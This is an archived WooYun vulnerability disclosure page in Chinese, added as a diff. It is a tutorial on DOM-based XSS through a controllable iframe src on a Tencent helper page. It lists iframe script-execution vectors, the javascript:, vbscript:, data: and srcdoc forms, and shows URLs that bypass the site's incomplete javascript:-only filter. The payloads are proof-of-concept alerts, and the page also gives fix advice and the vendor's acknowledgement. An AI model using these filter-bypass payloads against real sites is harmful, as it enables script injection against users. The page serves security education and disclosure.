@@ -1,0 +1,323 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 11. Dom Xss进阶 [善变iframe]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 11. Dom Xss进阶 [善变iframe]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-19 15:52</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-08：	细节向普通白帽子公开<br/>
+									2013-01-18：	细节向实习白帽子公开<br/>
+									2013-02-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">有时候，输出还会出现在 &lt;iframe src=&quot;[输出]&quot;&gt;&lt;/iframe&gt; 。 iframe 的 src属性本来应该是一个网址，但是iframe之善变，使得它同样可以执行javascript，而且可以用不同的姿势来执行。这一类问题，我将其归为[路径可控]问题。当然上面说到的是普通的反射型XSS。有时候程序员会使用javascript来动态的改变iframe的src属性，譬如：iframeA.src=&quot;[可控的url]&quot;; 同样会导致XSS问题，来看看本例吧～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 先来说说iframe的变化。<br />
+<br />
+<br />
+<br />
+1.1 最好懂的，onload执行js<br />
+<br />
+&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;<br />
+<br />
+<br />
+<br />
+1.2 src 执行javascript代码<br />
+<br />
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;<br />
+<br />
+<br />
+<br />
+1.3 IE下vbscript执行代码<br />
+<br />
+&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;  <br />
+<br />
+<br />
+<br />
+1.4 Chrome下data协议执行代码<br />
+<br />
+&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome<br />
+<br />
+<br />
+<br />
+1.5 上面的变体<br />
+<br />
+&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;<br />
+<br />
+<br />
+<br />
+1.6 Chrome下srcdoc属性<br />
+<br />
+&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;<br />
+<br />
+<br />
+<br />
+2. 有兴趣的，可以一个一个的去测试上面的效果，注意浏览器的特异性哦。<br />
+<br />
+<br />
+<br />
+3. 接着我们来看看具体的例子。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 我们先开调试工具，看看有没有可见的输出。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191544208b2fde268678badb84f04b190fc83a4b.jpg" target="_blank"><img src="../images/191544208b2fde268678badb84f04b190fc83a4b.jpg" alt="57.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到，我们参数的aaaaaa被带入到了&lt;iframe src=&quot;这里&quot;&gt;&lt;/iframe&gt;。<br />
+<br />
+<br />
+<br />
+这样一来，就满足了我们的使用条件。<br />
+<br />
+<br />
+<br />
+我们试试<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&amp;gid=yl&amp;cid=68&amp;from=</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+。。竟然没反应。我们来看看刚才的那个地方。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19154430ae2d748a5cf3dc621ba75b524a78024b.jpg" target="_blank"><img src="../images/19154430ae2d748a5cf3dc621ba75b524a78024b.jpg" alt="58.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到，src这次没属性了，看来腾讯做了什么过滤。我们继续搜索下一个toolframe试试。<br />
+<br />
+<br />
+<br />
+恩，看来就是这段代码导致的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19154453ad45121c6694123e384734c0ba5b6d4e.jpg" target="_blank"><img src="../images/19154453ad45121c6694123e384734c0ba5b6d4e.jpg" alt="59.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+一起看看这段代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>function OpenFrame(url) {<br />
+	if (url.toLowerCase().indexOf(&#039;http://&#039;) != &#039;-1&#039; || url.toLowerCase().indexOf(&#039;https://&#039;) != &#039;-1&#039; || url.toLowerCase().indexOf(&#039;javascript:&#039;) != &#039;-1&#039;) return false;<br />
+	document.getElementById(&quot;toolframe&quot;).src = url;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+不难看出，腾讯对 javascript:做出了判断。<br />
+<br />
+<br />
+<br />
+</p><pre><code>document.getElementById(&quot;toolframe&quot;).src = url;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这句是导致XSS的一句代码。而openFrame的url参数则来自于(无关代码省略)：<br />
+<br />
+<br />
+<br />
+</p><pre><code>...<br />
+var tool_url = getQueryStringValue(&quot;turl&quot;);<br />
+...<br />
+openFrame(tool_url);<br />
+...</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+5. 根据我们上面说道的iframe的利用方法，我们不难看出，腾讯的过滤是不完善的。<br />
+<br />
+<br />
+<br />
+在IE下，我们可以使用vbscript来执行代码。 vbscript里 &#039; 单引号表示注释，类似JS里的//<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=vbscript:msgbox(1)&#039;&amp;gid=yl&amp;cid=68&amp;from=</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19154511c94c96e795ccb1e17904ae4e54effdb5.jpg" target="_blank"><img src="../images/19154511c94c96e795ccb1e17904ae4e54effdb5.jpg" alt="60.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+在chrome下，我们可以用data协议来执行JS。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&#039;&amp;gid=yl&amp;cid=68&amp;from=</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191545294eb78ff9aa1baf1296bf17d4299b4189.jpg" target="_blank"><img src="../images/191545294eb78ff9aa1baf1296bf17d4299b4189.jpg" alt="61.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 就到这里。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">危险的不光是javascript:，<br />
+<br />
+vbscript:, data: 等同样需要过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016223" title="[腾讯实例教程] 那些年我们一起学XSS - 11. Dom Xss进阶 [善变iframe]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-19 16:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16223";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
